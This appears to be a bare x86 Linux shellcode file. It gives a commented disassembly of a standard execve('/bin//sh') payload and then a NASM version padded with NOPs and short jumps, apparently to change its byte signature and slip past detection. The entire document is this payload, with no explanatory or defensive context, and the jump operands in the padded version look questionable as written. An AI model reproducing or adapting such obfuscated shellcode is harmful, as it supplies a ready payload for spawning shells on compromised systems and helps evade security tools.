; 31 c0                 xor    %eax,%eax
; 50                    push   %eax
; 68 2f 2f 73 68        push   $0x68732f2f

; 68 2f 62 69 6e        push   $0x6e69622f
; 89 e3                 mov    %esp,%ebx

; 89 c1                 mov    %eax,%ecx
; 89 c2                 mov    %eax,%edx
; b0 0b                 mov    $0xb,%al
; cd 80                 int    $0x80

section .text
    global _start

_start:
    xor     eax, eax
    push    eax
    jmp short + 0x8
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    push    0x68732f2f
    jmp short + 0x6
    nop
    nop
    nop
    nop
    nop
    push    0x6e69622f
    jmp short + 0x6
    nop
    nop
    nop
    nop
    nop
    mov     ebx, esp
    mov     ecx, eax
    mov     edx, eax
    jmp short + 0x5
    nop
    nop
    nop
    nop
    mov     al, 0xb
    int     0x80